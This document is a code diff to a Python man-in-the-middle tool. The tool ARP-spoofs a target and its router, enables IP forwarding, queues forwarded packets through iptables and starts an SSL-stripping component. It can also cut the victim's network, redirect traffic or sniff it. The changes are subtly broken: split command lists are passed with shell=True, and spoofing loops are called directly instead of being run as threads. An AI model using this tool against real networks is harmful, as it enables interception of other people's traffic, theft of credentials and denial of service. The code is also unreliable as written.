@@ -125,30 +125,32 @@ def cut_net(packet):
 
 def enable_forward():
     command1 = "echo '1' > /proc/sys/net/ipv4/ip_forward".split()
-    subprocess.call(command1)
+    subprocess.call(command1, shell=True)
     command2 = "iptables -I FORWARD -j NFQUEUE --queue-num 0".split()
-    subprocess.call(command2)
+    subprocess.call(command2, shell=True)
 
 
 def final_spoof(target_ip, router_ip):
     target_mac = get_mac(target_ip)
     router_mac = get_mac(router_ip)
     while True:
-        spoof(target_ip, router_ip, target_mac)
-        spoof(router_ip, target_ip, router_mac)
-        sleep(2)
+        try:
+            spoof(target_ip, router_ip, target_mac)
+            spoof(router_ip, target_ip, router_mac)
+            sleep(2)
+        except Exception:
+            print("[-] Error While Spoofing the Target")
 
 
-def main(argv):
-    (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet, scan) = parseOptions(argv)
+def main(scan, cutNet, iface, redirect):
     if scan != "":
-        Scanner().run(scan)
-        sleep(2)
-        sys.exit()
+        try:
+            Scanner().run(scan)
+            sleep(2)
+            sys.exit()
+        except Exception:
+            print("[-] Couldn't Scan The Network")
     else:
-        enable_forward()
-        threading.Thread.run(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
-        threading.Thread.run(final_spoof(routerIp, targetIp))
         try:
             if cutNet:
                 queue(cut_net)
@@ -157,6 +159,11 @@ def main(argv):
             else:
                 sniff(iface)
         except Exception:
-            print("error1")
+            print("[-] Error in Final Comparision")
 
-main(sys.argv[1:])
+
+(logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet, scan) = parseOptions(sys.argv[1:])
+enable_forward()
+threading.Thread.start(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
+threading.Thread.start(final_spoof(routerIp, targetIp))
+threading.Thread.start(main(scan, cutNet, iface, redirect))
